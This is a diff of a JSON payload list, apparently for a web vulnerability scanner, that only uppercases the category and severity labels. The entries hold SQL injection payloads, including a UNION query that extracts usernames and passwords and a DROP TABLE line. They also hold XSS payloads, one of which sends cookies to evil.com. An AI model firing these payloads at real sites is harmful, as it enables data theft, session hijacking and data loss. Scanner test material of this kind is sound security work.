@@ -2,9 +2,9 @@
     {
         "payload_id": "sqli1",
         "payload": "' OR '1'='1",
-        "vuln_type": "SQL Injection",
-        "severity": "High",
-        "match_type": "boolean",
+        "vuln_type": "SQLI",
+        "severity": "HIGH",
+        "match_type": "BOOLEAN",
         "evidence_patterns": [
             "welcome admin",
             "login successful",
@@ -14,9 +14,9 @@
     {
         "payload_id": "sqli2",
         "payload": "' UNION SELECT null,username,password FROM users--",
-        "vuln_type": "SQL Injection",
-        "severity": "Critical",
-        "match_type": "union",
+        "vuln_type": "SQLI",
+        "severity": "CRITICAL",
+        "match_type": "UNION",
         "evidence_patterns": [
             "admin",
             "password",
@@ -26,9 +26,9 @@
     {
         "payload_id": "sqli3",
         "payload": "' AND SLEEP(5)--",
-        "vuln_type": "SQL Injection",
-        "severity": "Medium",
-        "match_type": "time-based",
+        "vuln_type": "SQLI",
+        "severity": "MEDIUM",
+        "match_type": "TIME_BASED",
         "evidence_patterns": [
             "delay",
             "timeout",
@@ -38,9 +38,9 @@
     {
         "payload_id": "sqli4",
         "payload": "' OR 1=1--",
-        "vuln_type": "SQL Injection",
-        "severity": "High",
-        "match_type": "boolean",
+        "vuln_type": "SQLI",
+        "severity": "HIGH",
+        "match_type": "BOOLEAN",
         "evidence_patterns": [
             "logged in",
             "bypass",
@@ -50,9 +50,9 @@
     {
         "payload_id": "sqli5",
         "payload": "1' ORDER BY 5--",
-        "vuln_type": "SQL Injection",
-        "severity": "Medium",
-        "match_type": "error-based",
+        "vuln_type": "SQLI",
+        "severity": "MEDIUM",
+        "match_type": "ERROR_BASED",
         "evidence_patterns": [
             "Unknown column",
             "ORDER BY",
@@ -62,9 +62,9 @@
     {
         "payload_id": "sqli6",
         "payload": "' OR EXISTS(SELECT * FROM users)--",
-        "vuln_type": "SQL Injection",
-        "severity": "High",
-        "match_type": "boolean",
+        "vuln_type": "SQLI",
+        "severity": "HIGH",
+        "match_type": "BOOLEAN",
         "evidence_patterns": [
             "true",
             "exists",
@@ -74,9 +74,9 @@
     {
         "payload_id": "sqli7",
         "payload": "1; DROP TABLE users--",
-        "vuln_type": "SQL Injection",
-        "severity": "Critical",
-        "match_type": "error-based",
+        "vuln_type": "SQLI",
+        "severity": "CRITICAL",
+        "match_type": "ERROR_BASED",
         "evidence_patterns": [
             "DROP TABLE",
             "table doesn't exist",
@@ -86,9 +86,9 @@
     {
         "payload_id": "sqli8",
         "payload": "' OR 'a'='a",
-        "vuln_type": "SQL Injection",
-        "severity": "Medium",
-        "match_type": "boolean",
+        "vuln_type": "SQLI",
+        "severity": "MEDIUM",
+        "match_type": "BOOLEAN",
         "evidence_patterns": [
             "success",
             "true",
@@ -98,9 +98,9 @@
     {
         "payload_id": "sqli9",
         "payload": "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
-        "vuln_type": "SQL Injection",
-        "severity": "Medium",
-        "match_type": "time-based",
+        "vuln_type": "SQLI",
+        "severity": "MEDIUM",
+        "match_type": "TIME_BASED",
         "evidence_patterns": [
             "sleep",
             "delay",
@@ -110,9 +110,9 @@
     {
         "payload_id": "sqli10",
         "payload": "' UNION SELECT @@version,null,null--",
-        "vuln_type": "SQL Injection",
-        "severity": "High",
-        "match_type": "union",
+        "vuln_type": "SQLI",
+        "severity": "HIGH",
+        "match_type": "UNION",
         "evidence_patterns": [
             "MySQL",
             "PostgreSQL",
@@ -123,9 +123,9 @@
     {
         "payload_id": "xss1",
         "payload": "<script>alert('XSS')</script>",
-        "vuln_type": "Cross-Site Scripting",
-        "severity": "Medium",
-        "match_type": "reflected",
+        "vuln_type": "XSS",
+        "severity": "MEDIUM",
+        "match_type": "REFLECTED",
         "evidence_patterns": [
             "alert",
             "XSS",
@@ -135,9 +135,9 @@
     {
         "payload_id": "xss2",
         "payload": "<img src=x onerror=alert(1)>",
-        "vuln_type": "Cross-Site Scripting",
-        "severity": "Medium",
-        "match_type": "reflected",
+        "vuln_type": "XSS",
+        "severity": "MEDIUM",
+        "match_type": "REFLECTED",
         "evidence_patterns": [
             "onerror",
             "img tag",
@@ -147,9 +147,9 @@
     {
         "payload_id": "xss3",
         "payload": "<svg onload=alert(document.cookie)>",
-        "vuln_type": "Cross-Site Scripting",
-        "severity": "High",
-        "match_type": "reflected",
+        "vuln_type": "XSS",
+        "severity": "HIGH",
+        "match_type": "REFLECTED",
         "evidence_patterns": [
             "document.cookie",
             "svg",
@@ -159,9 +159,9 @@
     {
         "payload_id": "xss4",
         "payload": "javascript:alert(1)",
-        "vuln_type": "Cross-Site Scripting",
-        "severity": "Medium",
-        "match_type": "DOM-based",
+        "vuln_type": "XSS",
+        "severity": "MEDIUM",
+        "match_type": "DOM_BASED",
         "evidence_patterns": [
             "javascript:",
             "alert",
@@ -171,9 +171,9 @@
     {
         "payload_id": "xss5",
         "payload": "\"><script>alert(1)</script>",
-        "vuln_type": "Cross-Site Scripting",
-        "severity": "Medium",
-        "match_type": "reflected",
+        "vuln_type": "XSS",
+        "severity": "MEDIUM",
+        "match_type": "REFLECTED",
         "evidence_patterns": [
             "quote break",
             "script tag",
@@ -183,9 +183,9 @@
     {
         "payload_id": "xss6",
         "payload": "<body onload=alert('XSS')>",
-        "vuln_type": "Cross-Site Scripting",
-        "severity": "Medium",
-        "match_type": "reflected",
+        "vuln_type": "XSS",
+        "severity": "MEDIUM",
+        "match_type": "REFLECTED",
         "evidence_patterns": [
             "body tag",
             "onload",
@@ -195,9 +195,9 @@
     {
         "payload_id": "xss7",
         "payload": "';alert(String.fromCharCode(88,83,83))//\\';alert(String.fromCharCode(88,83,83))//\\",
-        "vuln_type": "Cross-Site Scripting",
-        "severity": "High",
-        "match_type": "polyglot",
+        "vuln_type": "XSS",
+        "severity": "HIGH",
+        "match_type": "POLYGLOT",
         "evidence_patterns": [
             "multiple contexts",
             "alert",
@@ -207,9 +207,9 @@
     {
         "payload_id": "xss8",
         "payload": "<script>document.location='http://evil.com?c='+document.cookie</script>",
-        "vuln_type": "Cross-Site Scripting",
-        "severity": "Critical",
-        "match_type": "stored",
+        "vuln_type": "XSS",
+        "severity": "CRITICAL",
+        "match_type": "STORED",
         "evidence_patterns": [
             "document.cookie",
             "external domain",
@@ -219,9 +219,9 @@
     {
         "payload_id": "xss9",
         "payload": "<iframe src=\"javascript:alert('XSS')\">",
-        "vuln_type": "Cross-Site Scripting",
-        "severity": "Medium",
-        "match_type": "DOM-based",
+        "vuln_type": "XSS",
+        "severity": "MEDIUM",
+        "match_type": "DOM_BASED",
         "evidence_patterns": [
             "iframe",
             "javascript:",
@@ -231,9 +231,9 @@
     {
         "payload_id": "xss10",
         "payload": "<input onfocus=alert(1) autofocus>",
-        "vuln_type": "Cross-Site Scripting",
-        "severity": "Medium",
-        "match_type": "reflected",
+        "vuln_type": "XSS",
+        "severity": "MEDIUM",
+        "match_type": "REFLECTED",
         "evidence_patterns": [
             "onfocus",
             "autofocus",
